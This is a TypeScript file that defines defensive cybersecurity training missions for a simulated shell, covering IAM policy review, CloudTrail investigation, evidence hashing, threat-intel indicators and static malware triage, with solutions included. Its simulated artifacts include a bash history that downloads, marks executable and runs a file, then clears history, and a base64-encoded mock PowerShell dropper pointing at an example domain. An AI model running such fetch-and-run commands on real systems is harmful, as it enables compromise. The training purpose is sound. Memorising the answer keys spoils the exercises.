/** Months 13 to 20: cloud, forensics, intelligence, malware triage, AppSec, Kubernetes, AI. */
import type { Rng } from "@/lib/rng";
import type { FsNode } from "@/lib/shell/fs";
import { sha256 } from "@/lib/shell/hash";
import { submitted, type Built, type Mission, type RangeSet } from "./kit";
import { ana, own, stamp, two } from "./soc";

const read = (w: Built, p: string) => w.shell.fs.lookup(p, "/", w.shell.creds).content;
const fakeAccount = (rng: Rng) => String(rng.int(100000, 999999)) + String(rng.int(100000, 999999));

function policies(rng: Rng) {
  const shell = ana();
  const admin = rng.pick(["legacy-admin", "contractor-tmp", "old-migration"]);
  const statement = (Effect: string, Action: string | string[], Resource: string) => ({ Effect, Action, Resource });
  const doc = (s: object[]) => `${JSON.stringify({ Version: "2012-10-17", Statement: s }, null, 2)}\n`;
  shell.fs.put("/home/ana/policies/reports-read.json", doc([statement("Allow", ["s3:GetObject"], "arn:aws:s3:::reports/*")]), own);
  shell.fs.put("/home/ana/policies/ci-deploy.json", doc([statement("Allow", ["lambda:UpdateFunctionCode"], "arn:aws:lambda:eu-west-1:111122223333:function:api")]), own);
  shell.fs.put("/home/ana/policies/logs-write.json", doc([statement("Allow", ["logs:PutLogEvents"], "*")]), own);
  shell.fs.put(`/home/ana/policies/${admin}.json`, doc([statement("Allow", "*", "*")]), own);
  const pub = rng.pick(["oasis-public-assets", "oasis-invoices", "oasis-exports"]);
  const bucket = (name: string, principal: unknown) => `${JSON.stringify({ Version: "2012-10-17", Statement: [{ Effect: "Allow", Principal: principal, Action: "s3:GetObject", Resource: `arn:aws:s3:::${name}/*` }] }, null, 2)}\n`;
  for (const b of ["oasis-public-assets", "oasis-invoices", "oasis-exports"]) {
    shell.fs.put(`/home/ana/buckets/${b}.json`, bucket(b, b === pub ? "*" : { AWS: "arn:aws:iam::111122223333:role/app" }), own);
  }
  const outsider = fakeAccount(rng);
  shell.fs.put("/home/ana/roles/deploy-trust.json", `${JSON.stringify({ Version: "2012-10-17", Statement: [{ Effect: "Allow", Principal: { AWS: `arn:aws:iam::${outsider}:root` }, Action: "sts:AssumeRole" }] }, null, 2)}\n`, own);
  shell.fs.put("/home/ana/roles/accounts.txt", "Our accounts:\n111122223333 production\n444455556666 staging\n", own);
  return { shell, admin, pub, outsider };
}

const iam: Mission[] = [
  {
    id: "iam-1",
    title: "Find the wildcard",
    brief: "`~/policies/` holds IAM policies as JSON. One of them allows every action on every resource, which is full admin. Find it and submit its file name, without the path, like `name.json`.",
    hints: ["`cat policies/ci-deploy.json` shows what a normal one looks like.", "`grep -l '\"Action\": \"\\*\"' policies/*.json`"],
    build: (rng) => {
      const w = policies(rng);
      return { shell: w.shell, flag: `${w.admin}.json` };
    },
    passed: submitted,
    solve: (w) => ["grep -l '\"Action\": \"\\*\"' policies/*.json", `submit ${w.flag}`],
    debrief: "A name like `old-migration` tells you how this happens: a temporary fix that nobody removed. Note that `Resource: \"*\"` alone isn't always wrong. `logs-write.json` needs it, which is why you read policies instead of only grepping them.",
  },
  {
    id: "iam-2",
    title: "Which bucket is public?",
    brief: "`~/buckets/` holds S3 bucket policies. `\"Principal\": \"*\"` means anyone on the internet. Find the public bucket and submit its name (the file name without `.json`).",
    hints: ["`grep -l '\"Principal\": \"\\*\"' buckets/*.json`"],
    build: (rng) => {
      const w = policies(rng);
      return { shell: w.shell, flag: w.pub };
    },
    passed: submitted,
    solve: (w) => ["grep -l '\"Principal\": \"\\*\"' buckets/*.json", `submit ${w.flag}`],
    debrief: "Public is sometimes intended, for website assets. So the next question is always what's inside it. Scanners give you the finding, and only context gives you the severity.",
  },
  {
    id: "iam-3",
    title: "Who can assume this role?",
    brief: "A trust policy says who may assume a role. Read `~/roles/deploy-trust.json` with `jq`. The principal should be one of the accounts in `~/roles/accounts.txt`, but it isn't. Submit the 12-digit outside account ID.",
    hints: ["`jq -r '.Statement[0].Principal.AWS' roles/deploy-trust.json`", "The account ID is the long number in the ARN."],
    build: (rng) => {
      const w = policies(rng);
      return { shell: w.shell, flag: w.outsider };
    },
    passed: submitted,
    solve: (w) => ["jq -r '.Statement[0].Principal.AWS' roles/deploy-trust.json", `submit ${w.flag}`],
    debrief: "This role trusts an account you don't own, so anyone there may be able to act inside yours. A trust policy is the door, and a permissions policy is what's behind it. You need to check both.",
  },
];

function trailWorld(rng: Rng) {
  const shell = ana();
  const user = rng.pick(["svc-reports", "ci-bot", "backup-agent"]);
  const ip = rng.pick(["203.0.113.7", "198.51.100.77", "192.0.2.150"]);
  const key = `AKIAEXAMPLE${String(rng.int(100000000, 999999999))}`;
  const bucket = rng.pick(["oasis-invoices", "oasis-hr-exports"]);
  const ev = (eventTime: string, eventName: string, u: string, src: string, extra: object = {}) => JSON.stringify({ eventTime, eventSource: "aws.amazon.com", eventName, sourceIPAddress: src, userIdentity: { type: "IAMUser", userName: u, accessKeyId: u === user ? key : "AKIAEXAMPLEOTHER" }, ...extra });
  const rows: string[] = [];
  for (let i = 0; i < 120; i++) rows.push(ev(stamp(rng, 6, 20), rng.pick(["GetObject", "PutObject", "DescribeInstances", "ListBuckets"]), rng.pick(["ana", "omar", "app-role"]), `10.0.${rng.int(1, 9)}.${rng.int(2, 200)}`, { requestParameters: { bucketName: "oasis-assets" } }));
  const count = rng.int(6, 14);
  rows.push(ev("2026-10-27T02:03:11Z", "GetCallerIdentity", user, ip));
  rows.push(ev("2026-10-27T02:04:40Z", "ListBuckets", user, ip));
  rows.push(ev("2026-10-27T02:06:02Z", "StopLogging", user, ip, { requestParameters: { name: "main-trail" } }));
  for (let i = 0; i < count; i++) rows.push(ev(`2026-10-27T02:${two(10 + i)}:30Z`, "GetObject", user, ip, { requestParameters: { bucketName: bucket } }));
  shell.fs.put("/var/log/cloudtrail/events.json", `${rng.shuffle(rows).join("\n")}\n`);
  return { shell, user, ip, key, bucket, count };
}

const trail: Mission[] = [
  {
    id: "trail-1",
    title: "Who turned the lights off?",
    brief: "`/var/log/cloudtrail/events.json` has one JSON event per line. Someone stopped logging. Find the `StopLogging` event and submit the `userName` that did it.",
    greeting: "jq reads JSON: .a.b is a path, and select() keeps what matches.",
    hints: ["`grep StopLogging /var/log/cloudtrail/events.json`", "Cleaner: `jq -r 'select(.eventName == \"StopLogging\") | .userIdentity.userName' /var/log/cloudtrail/events.json`"],
    build: (rng) => {
      const w = trailWorld(rng);
      return { shell: w.shell, flag: w.user };
    },
    passed: submitted,
    solve: (w) => ["jq -r 'select(.eventName == \"StopLogging\") | .userIdentity.userName' /var/log/cloudtrail/events.json", `submit ${w.flag}`],
    debrief: "Disabling logging is close to a confession, because it almost never happens for a good reason. It's among the first detections you should write.",
  },
  {
    id: "trail-2",
    title: "Where did it come from?",
    brief: "The compromised identity is in `~/case.txt`. List the different `sourceIPAddress` values it used, and submit the one that isn't an internal `10.` address.",
    hints: ["`cat case.txt`", "`jq -r 'select(.userIdentity.userName == \"NAME\") | .sourceIPAddress' /var/log/cloudtrail/events.json | sort -u`"],
    build: (rng) => {
      const w = trailWorld(rng);
      w.shell.fs.put("/home/ana/case.txt", `Compromised: ${w.user}\n`, own);
      return { shell: w.shell, flag: w.ip };
    },
    passed: submitted,
    solve: (w) => [`jq -r 'select(.userIdentity.userName == "${/: (\S+)/.exec(read(w, "/home/ana/case.txt"))?.[1]}") | .sourceIPAddress' /var/log/cloudtrail/events.json | sort -u`, `submit ${w.flag}`],
    debrief: "A service identity should only act from known places. One outside IP is a strong signal, and it becomes something you can search for across everything else.",
  },
  {
    id: "trail-3",
    title: "What did they take?",
    brief: "Still using `~/case.txt`: find the bucket that identity read with `GetObject`, and count the reads. Submit the answer as `bucket:count`, like `my-bucket:12`.",
    hints: ["`jq -r 'select(.userIdentity.userName == \"NAME\" and .eventName == \"GetObject\") | .requestParameters.bucketName' /var/log/cloudtrail/events.json | sort | uniq -c`"],
    build: (rng) => {
      const w = trailWorld(rng);
      w.shell.fs.put("/home/ana/case.txt", `Compromised: ${w.user}\n`, own);
      return { shell: w.shell, flag: `${w.bucket}:${w.count}` };
    },
    passed: submitted,
    solve: (w) => [`jq -r 'select(.userIdentity.userName == "${/: (\S+)/.exec(read(w, "/home/ana/case.txt"))?.[1]}" and .eventName == "GetObject") | .requestParameters.bucketName' /var/log/cloudtrail/events.json | sort | uniq -c`, `submit ${w.flag}`],
    debrief: "Now you can tell legal what was touched, which decides whether this is a notifiable breach. Note the catch, though: S3 object reads only appear if data events were switched on for that trail.",
  },
];

function forensicWorld(rng: Rng) {
  const shell = ana();
  const files = ["disk-image.part1", "memory.dump", "logs.tar"];
  const body: Record<string, string> = {};
  for (const f of files) body[f] = `${f} evidence block ${rng.int(1, 1e9)}\n`;
  const altered = rng.pick(files);
  const lines = files.map((f) => `${sha256(body[f] as string)}  ${f}`);
  for (const f of files) shell.fs.put(`/home/ana/evidence/${f}`, f === altered ? `${body[f]}tampered\n` : (body[f] as string), own);
  shell.fs.put("/home/ana/evidence/SHA256SUMS", `${lines.join("\n")}\n`, own);
  return { shell, altered };
}

const forensics: Mission[] = [
  {
    id: "dfir-1",
    title: "Verify the evidence",
    brief: "Hashes were recorded at collection in `~/evidence/SHA256SUMS`. Check the files against them from inside that folder. One no longer matches. Submit its file name.",
    hints: ["`cd evidence`", "`sha256sum -c SHA256SUMS`"],
    build: (rng) => {
      const w = forensicWorld(rng);
      return { shell: w.shell, flag: w.altered };
    },
    passed: submitted,
    solve: (w) => ["cd evidence", "sha256sum -c SHA256SUMS", `submit ${w.flag}`],
    debrief: "A changed hash means you can't rely on that copy. Go back to the original, record what happened, and don't quietly carry on. Admitting this is what keeps the rest of your evidence credible.",
  },
  {
    id: "dfir-2",
    title: "What did they run?",
    brief: "You've got a copy of a user's home folder in `/evidence/home`. Shell history is a useful artifact. Find the file the user downloaded and made executable, and submit its file name.",
    hints: ["Hidden files start with a dot: `ls -a /evidence/home`", "`cat /evidence/home/.bash_history`", "Look for `curl` or `wget`, then `chmod +x`."],
    build: (rng) => {
      const shell = ana();
      const name = rng.pick(["updater", "sysinfo.sh", ".cache-agent"]);
      shell.fs.put("/evidence/home/.bash_history", ["ls", "cd /tmp", "uname -a", `curl -O http://files.example/${name}`, `chmod +x ${name}`, `./${name}`, "history -c"].join("\n") + "\n");
      shell.fs.put("/evidence/home/notes.txt", "Reminder: submit timesheet\n");
      return { shell, flag: name };
    },
    passed: submitted,
    solve: (w) => ["cat /evidence/home/.bash_history", `submit ${w.flag}`],
    debrief: "Fact: this history file shows those commands. Inference: the user typed them, since a script or another person could have. Note also that a real attacker often clears history, so its absence means little.",
  },
  {
    id: "dfir-3",
    title: "What changed after the break-in?",
    brief: "`/evidence/marker` has the time of the first attacker login as its modification time. Find the one regular file under `/etc` that was modified after that, and submit its full path.",
    hints: ["`find /etc -type f -newer /evidence/marker`"],
    build: (rng) => {
      const shell = ana();
      const old = Date.parse("2026-09-01T00:00:00Z") / 1000;
      const walk = (n: FsNode) => {
        n.mtime = old;
        for (const c of n.children.values()) walk(c);
      };
      walk(shell.fs.lookup("/etc", "/", shell.creds));
      const f = `/etc/${rng.pick(["cron.d/sysupdate", "ld.so.preload", "ssh/sshd_config.d/10-local.conf"])}`;
      shell.fs.put(f, "# changed\n").mtime = Date.parse("2026-10-27T03:40:00Z") / 1000;
      shell.fs.put("/evidence/marker", "").mtime = Date.parse("2026-10-27T02:30:00Z") / 1000;
      return { shell, flag: f };
    },
    passed: submitted,
    solve: (w) => ["find /etc -type f -newer /evidence/marker", `submit ${w.flag}`],
    debrief: "A short list of changed files turns \"look everywhere\" into \"look here\". Remember that attackers can reset timestamps, so back this up with another source, such as `$MFT` on Windows or file-integrity monitoring.",
  },
];

function intelWorld(rng: Rng) {
  const shell = ana();
  const ips = rng.shuffle(["203.0.113.7", "203.0.113.90", "198.51.100.77", "192.0.2.150", "198.51.100.23"]).slice(0, rng.int(3, 5));
  const domain = rng.pick(["cdn-update.example", "login-portal.example", "sync-files.example"]);
  const host = rng.pick(["FIN-LAP-03", "HR-LAP-12", "ENG-LAP-41"]);
  const report = [
    "Campaign report, TLP:GREEN", "", "The group phishes logistics firms and installs a loader.", `Payloads are fetched from hxxps://${domain.replace(/\.example$/, "[.]example")}/a.bin.`,
    "Infrastructure seen:", ...ips.map((i) => `  - ${i.replace(/\.(\d+)$/, "[.]$1")}`), ...ips.slice(0, 2).map((i) => `Traffic to ${i.replace(/\.(\d+)$/, "[.]$1")} was seen again on 24 October.`),
  ];
  shell.fs.put("/home/ana/report.txt", `${report.join("\n")}\n`, own);
  const proxy = Array.from({ length: 200 }, () => `${stamp(rng)},${rng.pick(["OPS-LAP-07", "SRV-WEB-02", "FIN-LAP-03", "HR-LAP-12"])},${rng.pick(["intranet.example", "mail.example", "news.example", "updates.vendor.example"])},200`);
  proxy.push(`${stamp(rng)},${host},${domain},200`);
  shell.fs.put("/var/log/proxy.csv", `time,host,domain,status\n${rng.shuffle(proxy).join("\n")}\n`);
  for (const [n, tlp] of [["a", "TLP:CLEAR"], ["b", "TLP:GREEN"], ["c", "TLP:AMBER+STRICT"], ["d", "TLP:RED"]] as const) shell.fs.put(`/home/ana/reports/report-${n}.txt`, `${tlp}\nSummary of activity.\n`, own);
  return { shell, ips, domain, host };
}

const intel: Mission[] = [
  {
    id: "intel-1",
    title: "Extract the indicators",
    brief: "`~/report.txt` lists attacker IPs, defanged as `203.0.113[.]7`. Some appear twice. Refang them by replacing `[.]` with `.`, pull out the IPs, and submit how many **different** ones there are.",
    hints: ["`sed 's/\\[\\.\\]/./g' report.txt` refangs the text.", "`grep -Eo '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+'` keeps only IPs.", "Then `| sort -u | wc -l`."],
    build: (rng) => {
      const w = intelWorld(rng);
      return { shell: w.shell, flag: String(w.ips.length) };
    },
    passed: submitted,
    solve: (w) => ["sed 's/\\[\\.\\]/./g' report.txt | grep -Eo '[0-9]+\\.[0-9]+\\.[0-9]+\\.[0-9]+' | sort -u | wc -l", `submit ${w.flag}`],
    debrief: "Defanging stops an accidental click, and refanging is what your tools need. Removing duplicates matters as well: a report repeats indicators, so a raw count overstates how many you have.",
  },
  {
    id: "intel-2",
    title: "Are we affected?",
    brief: "The report names a domain. Refang it, then search `/var/log/proxy.csv` (columns `time,host,domain,status`) for it. Submit the host that contacted it.",
    hints: ["`grep -i hxxp report.txt`, then remove the `[` and `]` in your head.", "`grep <domain> /var/log/proxy.csv`"],
    build: (rng) => {
      const w = intelWorld(rng);
      return { shell: w.shell, flag: w.host };
    },
    passed: submitted,
    solve: (w) => [`grep ${/hxxps:\/\/([^/]+)\//.exec(read(w, "/home/ana/report.txt"))?.[1]?.replace("[.]", ".")} /var/log/proxy.csv`, `submit ${w.flag}`],
    debrief: "This is what intelligence is for. A report became a question, a query and an answer: one laptop to investigate, not a vague worry.",
  },
  {
    id: "intel-3",
    title: "Can I share this?",
    brief: "`~/reports/` holds four reports with a TLP label on the first line. Your team lead wants to post one on the public community blog. Exactly one label allows that. Submit that report's file name.",
    hints: ["`head -1 reports/*`", "Or `grep -l 'TLP:CLEAR' reports/*`"],
    build: (rng) => {
      const { shell } = intelWorld(rng);
      return { shell, flag: "report-a.txt" };
    },
    passed: (w) => submitted(w) || w.shell.submitted.includes("reports/report-a.txt"),
    solve: (w) => ["grep -l 'TLP:CLEAR' reports/*", `submit ${w.flag}`],
    debrief: "`TLP:CLEAR` is the only label without sharing limits. Breaking a TLP label breaks the trust that makes sharing possible at all.",
  },
];

function sampleWorld(rng: Rng) {
  const shell = ana();
  const domain = rng.pick(["cdn-sync.example", "telemetry-hub.example", "patch-node.example"]);
  const sample = `MZ\x00\x00\x90\x00This is a harmless training file, not a program.\x00\x00WinHttpOpen\x00GetTempPathA\x00https://${domain}/gate\x00RunOnce\x00\x00`;
  const family = rng.pick(["LoaderFox", "QuietCrane", "PaperWasp"]);
  const hash = sha256(sample);
  shell.fs.put("/home/ana/samples/invoice.exe.vir", sample, { owner: "ana", mode: 0o444 });
  const intel = Array.from({ length: 30 }, (_, i) => `${sha256(`clean-${i}-${rng.int(1, 1e9)}`)},${rng.pick(["AdLoad", "GenericTrojan", "CoinMiner"])}`);
  intel.splice(rng.int(0, 29), 0, `${hash},${family}`);
  shell.fs.put("/opt/intel/known-hashes.csv", `sha256,family\n${intel.join("\n")}\n`);
  const blob = btoa(`https://${domain}/stage2 --install-dir C:\\ProgramData\\svc`);
  shell.fs.put("/home/ana/samples/dropper.ps1.vir", `$x = "${blob}"\n$y = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x))\n# The script stops here in this training copy.\n`, { owner: "ana", mode: 0o444 });
  return { shell, domain, family };
}

const malware: Mission[] = [
  {
    id: "mal-1",
    title: "Hash first",
    brief: "`~/samples/invoice.exe.vir` is a harmless training file, handled as if it were real. Never run a sample: hash it instead. Search `/opt/intel/known-hashes.csv` (columns `sha256,family`) for that hash, and submit the family name.",
    hints: ["`sha256sum samples/invoice.exe.vir`", "`grep <hash> /opt/intel/known-hashes.csv`"],
    build: (rng) => {
      const w = sampleWorld(rng);
      return { shell: w.shell, flag: w.family };
    },
    passed: submitted,
    solve: (w) => {
      const r = w.shell.run("sha256sum samples/invoice.exe.vir").split(" ")[0];
      return [`grep ${r} /opt/intel/known-hashes.csv`, `submit ${w.flag}`];
    },
    debrief: "Thirty seconds, and you know what it probably is. You've run nothing and exposed nothing. The `.vir` suffix is a habit too, because it stops a double-click from running the file.",
  },
  {
    id: "mal-2",
    title: "What does it call out to?",
    brief: "Static triage continues. `strings` prints the readable text inside a binary without running it. Find the web address inside the sample and submit its **domain**.",
    hints: ["`file samples/invoice.exe.vir`", "`strings samples/invoice.exe.vir | grep -i http`"],
    build: (rng) => {
      const w = sampleWorld(rng);
      return { shell: w.shell, flag: w.domain };
    },
    passed: submitted,
    solve: (w) => ["strings samples/invoice.exe.vir | grep -i http", `submit ${w.flag}`],
    debrief: "`WinHttpOpen` hints at web traffic and `RunOnce` at persistence, while the URL is an indicator you can search your proxy logs for. Packed malware hides strings like these, so finding few strings is itself a clue.",
  },
  {
    id: "mal-3",
    title: "Decode the script",
    brief: "`~/samples/dropper.ps1.vir` hides a string in base64. Read the script as text (don't run it), decode the value of `$x`, and submit the domain inside.",
    hints: ["`cat samples/dropper.ps1.vir`", "`grep -o '\"[^\"]*\"' samples/dropper.ps1.vir | head -1 | tr -d '\"' | base64 -d`"],
    build: (rng) => {
      const w = sampleWorld(rng);
      return { shell: w.shell, flag: w.domain };
    },
    passed: submitted,
    solve: (w) => ["grep -o '\"[^\"]*\"' samples/dropper.ps1.vir | head -1 | tr -d '\"' | base64 -d", `submit ${w.flag}`],
    debrief: "Script malware is often easiest to analyse, because you can read it. Real PowerShell `-EncodedCommand` values are UTF-16LE, so they decode with stray characters between the letters: expect that.",
  },
];

export const MISSIONS_ADVANCED: Record<string, RangeSet> = {
  iam: { title: "Read cloud permissions", missions: iam },
  trail: { title: "Investigate with CloudTrail", missions: trail },
  forensics: { title: "Work from evidence", missions: forensics },
  intel: { title: "Turn a report into answers", missions: intel },
  malware: { title: "Triage a sample without running it", missions: malware },
};
